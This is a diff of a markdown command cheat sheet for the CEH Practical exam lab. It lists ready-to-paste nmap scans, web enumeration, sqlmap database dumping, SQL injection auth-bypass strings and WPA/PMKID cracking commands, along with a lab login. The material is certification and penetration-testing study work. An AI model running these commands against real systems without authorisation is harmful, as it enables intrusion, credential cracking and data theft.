@@ -6,18 +6,13 @@ exam_weight: high
 status: done
 unresolved: []
 ---
-
-# CEH Practical — command flow
-
-Every placeholder is a shell variable — set them once in 00, then paste the rest as-is.
-Blocks run 00 → 13; 08b and 09 are side routes, not extra steps. Companion page: `CEH-Flow-Cheat.html` (same content, colourised).
-
 ## 00 — variables + pre-flight
 
 ```bash
 mkdir -p ~/ceh && cd ~/ceh
 
-LHOST=$(ip -4 -o addr show scope global | awk '{print $4}' | cut -d/ -f1 | head -1)
+LAN=$(ip -4 -o addr show scope global | awk '{print $4}' | head -1)   # your IP/mask, e.g. 10.10.55.24/24
+LHOST=${LAN%/*}                          # your IP only → payloads, reverse shells
 NET=10.10.55.0/24        # target subnet
 IP=10.10.55.24           # target host
 USER=jones
@@ -33,27 +28,35 @@ script -q ~/ceh/session.log          # optional: transcript of the whole session
 command -v zenmap xsltproc nmap hydra sqlmap msfconsole adb
 ```
 
-Plain assignment is enough — one terminal, no subshells. `LHOST` is your Parrot IP, needed by every reverse payload. `command -v` tells you in one line which tool this image lacks.
+Variables for single values (`$IP`, `$PORTS`, `$LHOST`), a file for the host list. `LAN` is taken from your own interface, so you never type your subnet by hand. Plain assignment is enough — one terminal, no subshells. `command -v` tells you in one line which tool this image lacks.
 
-## 01 — host sweep
+## 01 — host sweep → hostlist.txt
 
 ```bash
-sudo nmap -sn $NET -oA sn
-grep 'Status: Up' sn.gnmap | awk '{print $2}'
+sudo nmap -sn -oA hosts $LAN                      # $LAN = your IP/mask
+grep 'Status: Up' hosts.gnmap | awk '{print $2}' > hostlist.txt
+wc -l hostlist.txt                                # how many hosts are alive
 ```
+
+Only `Status: Up` goes into the file — ping-scan grepable output also lists dead hosts, and `-Pn` would scan them all over again.
 
 ## 02 — full port scan (fast, always output)
 
 ```bash
-sudo nmap -p- -Pn -T4 --min-rate 5000 -oA full $IP        # single host
-sudo nmap -p- -Pn -T4 --min-rate 5000 -oA full $NET       # whole subnet
-PORTS=$(cut -d/ -f1 full.gnmap | sort -un | paste -sd,)
-sudo nmap -sV --version-light -p $PORTS -oA svc $IP       # version on open ports only
-sudo nmap -sV -sC -Pn -p $PORTS -oA deep $IP              # + default scripts
+sudo nmap -p- -Pn -n -T4 -iL hostlist.txt -oA full        # every TCP port, every live host, no DNS
+PORTS=$(grep 'Ports:' full.gnmap | grep -oE '[0-9]+/open' | cut -d/ -f1 | sort -un | paste -sd,)
+sudo nmap -A -Pn -p $PORTS $IP -oA deep                   # -sV -sC -O on one host
+sudo nmap -sV -sC -O -Pn -p $PORTS -iL hostlist.txt -oA svc   # same, whole list
+sudo nmap -sV -Pn -p $PORTS --script vuln $IP -oA cve     # phase 3: CVEs on those ports
+sudo nmap -sV -Pn -p $PORTS --script vuln -iL hostlist.txt -oA cve
+sudo nmap -sU --top-ports 100 -Pn $IP -oA udp             # top 100 UDP
+sudo nmap -sU --top-ports 100 -Pn -iL hostlist.txt -oA udp
 sudo nmap -sS -Pn -p 53,88,135,139,389,445,636,3268,3269 -oA dc $NET   # DC hunt
+
+for f in *.xml; do xsltproc "$f" -o "${f%.xml}.html"; done   # every report → HTML
 ```
 
-Never run scripts with `-p-`. `--min-rate 5000` is what makes it fast; drop to 1000 if you see drops.
+Host list from the file (`-iL`), single targets from variables — that is the split. Never run scripts with `-p-`: sweep all ports first, then `-sV`/`-sC` only on the ports it found. `-T4` is the speed knob. `--min-rate` can backfire — nmap's own docs warn that an excessive rate causes retransmissions, so the scan ends up slower and less accurate.
 
 ## 03 — read the output (no bat, no web parser)
 
@@ -66,16 +69,19 @@ zenmap full.xml                             # or Scan → Open (Ctrl+O) → full
 # no zenmap? same view, no GUI: nmap ships the stylesheet it uses
 xsltproc /usr/share/nmap/nmap.xsl full.xml > full.html && xdg-open full.html
 nmap -sV $IP -oX - | xsltproc /usr/share/nmap/nmap.xsl - > view.html   # live, no file
+xdg-open cve.html                           # open any converted report
+
+# online XML viewers: https://www.nmapparser.com/es · https://www.devoven.com/tools/nmap-viewer · https://sumanrox.github.io/
 
 less -R full.nmap                           # -R = keep colours, never garbles
 grep -i 'open' full.gnmap | column -t       # aligned table
 xmllint --format deep.xml | less -R         # pretty XML
-grep -c 'Mercury/32' svc.nmap               # "how many services" → count lines
+grep -c 'Mercury/32' deep.nmap              # "how many services" → count lines
 awk '/open/{print $1,$3,$4}' full.nmap
-cat svc.nmap | tee ~/ceh/notes.txt          # tee = screen AND file
+cat deep.nmap | tee ~/ceh/notes.txt         # tee = screen AND file
 ```
 
-On the Parrot exam box use Zenmap first (`zenmap full.xml` = the pretty view). The `xsltproc` line is the same renderer without a GUI, for when Zenmap is missing. Both read the same `-oX` file. `tee` copies stdin to a file while still printing it.
+On the Parrot exam box use Zenmap first (`zenmap full.xml` = the pretty view). The `xsltproc` line is the same renderer without a GUI, for when Zenmap is missing. Both read the same `-oX` file. `tee` copies stdin to a file while still printing it. Zenmap missing? `which zenmap`, then `sudo apt update && sudo apt install zenmap`.
 
 ## 04 — service enumeration
 
@@ -108,6 +114,7 @@ curl -sI http://$IP | grep -i -E 'server|x-powered-by'
 nikto -h http://$IP -Tuning 123bde
 gobuster dir -u http://$IP -w /usr/share/wordlists/dirb/common.txt -x php,txt,bak,zip,html
 curl -s http://$IP/Flag.txt; curl -s http://$IP/flag.txt      # try flat paths first
+sudo apt-get install exploitdb                                # if searchsploit is missing
 searchsploit drupal 7; searchsploit -m 12345                  # -m = copy exploit to cwd
 wpscan --url http://$IP --enumerate vp,vt,u                   # page_id= → WordPress
 zaproxy &                                                     # ZAP GUI; or: wapiti -u http://$IP -m sql
@@ -117,20 +124,43 @@ zaproxy &                                                     # ZAP GUI; or: wap
 
 ```bash
 URL="http://$IP/?id=1"
-sqlmap -u "$URL" --batch --dbs
-sqlmap -u "$URL" --batch -D $DB --tables
-sqlmap -u "$URL" --batch -D $DB -T $TBL --columns
+sqlmap -u "$URL" --batch --dbs                                  # databases
+sqlmap -u "$URL" --batch -D $DB --tables                        # tables
+sqlmap -u "$URL" --batch -D $DB -T $TBL --columns               # columns
 sqlmap -u "$URL" --batch -D $DB -T $TBL -C flag --dump
 sqlmap -u "$URL" --batch --sql-query "SELECT password FROM users WHERE username='Daniel'"
+sqlmap -u "$URL" --batch --current-db --flush-session           # current DB, drop cached results
 
-# logged in (cinema / Karen:computer): console → document.cookie
-sqlmap -u "http://$IP/search.php?q=test" --cookie="PHPSESSID=abc" --batch --dbs
+# injection points
+sqlmap -u "http://$IP/page?id=1" --batch --dbs                             # GET parameter
+sqlmap -u "http://$IP/page" --headers="X-Forwarded-For: 1*" --batch --dbs  # HTTP header
+sqlmap -u "http://$IP/search.php?q=test" --cookie="PHPSESSID=abc" --batch --dbs   # cookie (cinema / Karen:computer → console → document.cookie)
+sqlmap -r request.txt --batch --dbs                                        # POST / saved Burp request
+sqlmap -u "http://$IP" --forms --crawl=3 --level=5 --risk=3 --batch --dbs  # forms, auto discovery
+sqlmap -u "$URL" -p username --batch --dbs                                 # JSON parameter
 
-# no visible parameter
-sqlmap -u "http://$IP" --forms --crawl=3 --level=5 --risk=3 --batch --dbs
+# force / tune
+sqlmap -u "$URL" --dbms=MySQL --level=5 --risk=3 --technique=BEUSTQ -v 3 --batch
+sqlmap -u "$URL" --technique=U --union-cols=1-10 --batch --dbs             # UNION only
 ```
 
-page_id style: open the page, Ctrl+F "flag" in view-source before firing sqlmap.
+```sql
+' OR 1=1--                          -- auth bypass
+' AND 1=1--                         -- boolean true
+' AND 1=2--                         -- boolean false
+' UNION SELECT NULL,NULL,NULL--     -- column-count probe
+```
+
+| technique | flag | extracts via |
+|---|---|---|
+| boolean-based blind | `B` | true/false response difference |
+| time-based blind | `T` | response delay |
+| UNION-based | `U` | query results (matching column count/types) |
+| error-based | `E` | database error messages |
+| stacked queries | `S` | extra statements, if supported |
+| inline queries | `Q` | nested `SELECT` |
+
+page_id style: open the page, Ctrl+F "flag" in view-source before firing sqlmap. Burp: Proxy → Repeater → Intruder; `Request → Save item` gives the `request.txt` for `-r`. Nested SQLi: one query's output feeds another, second stage is manual. A JSON response does not prevent SQLi.
 
 ## 07 — credentials + hash cracking
 
@@ -278,7 +308,6 @@ aircrack-ng -b $BSSID -w $WL "$CAP"
 hcxpcaptool -z pmkid.22000 "$CAP"; hashcat -m 22000 pmkid.22000 $WL
 
 gvm-start && xdg-open https://127.0.0.1:9392           # reports → sort severity → CVE
-sudo nmap -Pn --script vuln $IP
 sudo nmap -sV --script vulners -p $PORTS $IP
 ```
 
